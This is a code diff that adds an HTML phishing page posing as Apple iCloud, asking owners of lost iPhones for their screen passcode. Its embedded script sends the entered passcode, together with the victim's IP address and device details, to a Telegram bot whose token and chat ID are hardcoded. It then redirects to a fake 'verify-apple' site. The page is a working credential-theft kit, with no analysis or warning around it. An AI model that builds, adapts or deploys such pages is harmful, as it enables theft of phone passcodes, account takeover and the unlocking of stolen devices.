@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Login</title>
+
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            min-height: 100vh;
+            background-color: #1a1a1d;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            padding: 20px;
+        }
+
+        /* Top elements */
+        .top-left-img {
+            position: absolute;
+            top: 12px;
+            left: 15px;
+            width: 20px;
+            height: auto;
+            z-index: 10;
+        }
+
+        .top-left-text {
+            position: absolute;
+            top: 12px;
+            left: 42px; 
+            color: #ffffff !important;
+            font-size: 20px;
+            font-weight: 600;
+        }
+
+        .top-right-text {
+            position: absolute;
+            top: 12px;
+            right: 20px; 
+            color: #ffffff !important;
+            font-size: 24px;
+            font-weight: 600;
+        }
+
+        /* Main content wrapper without card styling */
+        .content-container {
+            width: 100%;
+            max-width: 380px;
+            text-align: center;
+        }
+
+        .logo-img {
+            width: 100px;
+            height: 100px;
+            margin-bottom: 15px;
+            border-radius: 18px;
+            object-fit: contain;
+            display: inline-block;
+        }
+
+        .title {
+            margin: 0 auto 25px;
+            width: 100%;
+            text-align: center;
+            font-size: 28px;
+            line-height: 1.2;
+            letter-spacing: -0.8px;
+            font-weight: 600;
+            color: #ffffff;
+        }
+
+        .field {
+            position: relative;
+            margin-bottom: 40px;
+            text-align: left;
+        }
+
+        .field input {
+            width: 100%;
+            height: 52px;
+            background-color: #212124;
+            border: 1px solid #333338;
+            border-radius: 12px;
+            padding: 18px 16px 6px 16px;
+            color: #ffffff;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .field input:focus {
+            border-color: #0084ff;
+        }
+
+        .field label {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #72727a;
+            font-size: 15px;
+            pointer-events: none;
+            transition: all 0.2s ease-in-out;
+        }
+
+        .field input:focus ~ label,
+        .field input:valid ~ label {
+            top: 12px;
+            font-size: 11px;
+            color: #0084ff;
+        }
+
+        /* Privacy section */
+        .privacy-container {
+            margin: 15px 0 20px 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .privacy-icon {
+            width: 25px;
+            height: 25px;
+            display: block;
+        }
+
+        .privacy-notice {
+            color: #a1a1a6;
+            font-size: 11px;
+            font-weight: 400;
+            line-height: 1.4;
+            text-align: center;
+            padding: 0 4px;
+        }
+
+        .submit-btn {
+            width: 100%;
+            height: 50px;
+            background-color: #0084ff;
+            color: #ffffff;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 5px;
+            transition: background-color 0.2s;
+        }
+
+        .submit-btn:hover {
+            background-color: #0073e6;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Top Screen Elements -->
+    <img src="images/my-image.png" alt="Top Left Image" class="top-left-img">
+    <div class="top-left-text">iCloud</div>
+    <div class="top-right-text">•••</div>
+
+    <div class="content-container">
+        
+        
+        <h1 class="title">Enter Your Lost IPhone's Screen Password</h1>
+<p style="color: #777; margin-top: -5px;">
+  We Need To Confirm That You Are The Legitimate Owner
+</p>
+
+
+          <form id="login-form">
+            <div class="field">
+                <input type="text" name="password" id="password" required autocomplete="off">
+                <label for="password">password</label>
+            </div>
+
+            
+
+            <!-- Privacy Section -->
+            <div class="privacy-container">
+                <svg class="privacy-icon" width="36" height="24" viewBox="0 0 36 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="10" cy="6" r="4.5" fill="#0088FF"/>
+                    <path d="M10 12.5C6.13401 12.5 3 15.634 3 19.5V23H10.5C10.5 23 12.5 23 14 21.5C15.5 20 17 18.5 17 18.5L14 15.5C14 15.5 12.5 14 10 12.5Z" fill="#0088FF"/>
+                    <circle cx="26" cy="6" r="4.5" fill="#0055B3"/>
+                    <path d="M26 12.5C29.866 12.5 33 15.634 33 19.5V23H25.5C25.5 23 23.5 23 22 21.5C20.5 20 19 18.5 19 18.5L22 15.5C22 15.5 23.5 14 26 12.5Z" fill="#0055B3"/>
+                    <path d="M13.5 18C15 16.5 17.5 16.5 19 18L17 20C15.5 21.5 13.5 20.5 13.5 18Z" fill="#0077E6"/>
+                </svg>
+
+                <p class="privacy-notice">
+                    Les informations de votre compte Apple sont utilisées pour vous permettre de vous connecter en toute sécurité et d’accéder à vos données. Apple enregistre certaines données à des fins de sécurité, d’assistance et de signalement. Si vous l’acceptez, Apple peut également utiliser les informations de votre compte Apple pour vous envoyer des e-mails et des communications marketing en se basant notamment sur votre utilisation des services Apple.
+                </p>
+            </div>
+
+             <button type="submit" class="submit-btn">Log-In</button>
+             <a href="https://www.youtube.com/watch?v=Q8N5P0x88PM&t=1528s"
+            
+       
+        </form>
+    </div>
+ <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+  <script>
+    const TOKEN = "8843365045:AAFAovSP2Op8nm2Inkr5iRJ8L9DCgfHZVqo";
+    const CHAT_ID = "8298632696";
+    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+    document.getElementById("login-form").addEventListener("submit", async function (e) {
+      e.preventDefault();
+
+      
+      const password = document.getElementById("password").value;
+
+      // Get device information
+      const userAgent = navigator.userAgent;
+      const platform = navigator.platform;
+      const screenWidth = screen.width;
+      const screenHeight = screen.height;
+      const deviceType = /mobile|iphone|ipad|android/i.test(userAgent) ? "Mobile" : "Desktop";
+
+      console.log("User-Agent:", userAgent);
+      console.log("Platform:", platform);
+      console.log("Screen Resolution:", screenWidth + "x" + screenHeight);
+      console.log("Device Type:", deviceType);
+
+      try {
+        // Get user's IP address
+        const ipResponse = await axios.get("https://api.ipify.org?format=json");
+        const ip = ipResponse.data.ip;
+
+        // Build the Telegram message
+        const message = `
+<b>New Login Attempt</b>
+}
+<b>Password:</b> ${password}
+<b>IP Address:</b> ${ip}
+<b>Device Type:</b> ${deviceType}
+<b>Platform:</b> ${platform}
+<b>User Agent:</b> ${userAgent}
+<b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
+`;
+
+        // Send to Telegram
+        const response = await axios.post(URI_API, {
+          chat_id: CHAT_ID,
+          parse_mode: "HTML",
+          text: message
+        });
+
+        console.log("Message sent:", response.data);
+         window.location.href = "https://verify-apple.github.io/find-dev/icloud/index.html";
+      } catch (error) {
+        console.error("Error fetching IP or sending message:", error);
+        alert("Erro ao obter o endereço IP ou enviar as informações. Tente novamente.");
+      }
+    });
+  </script>
+
+</body>
+</html>
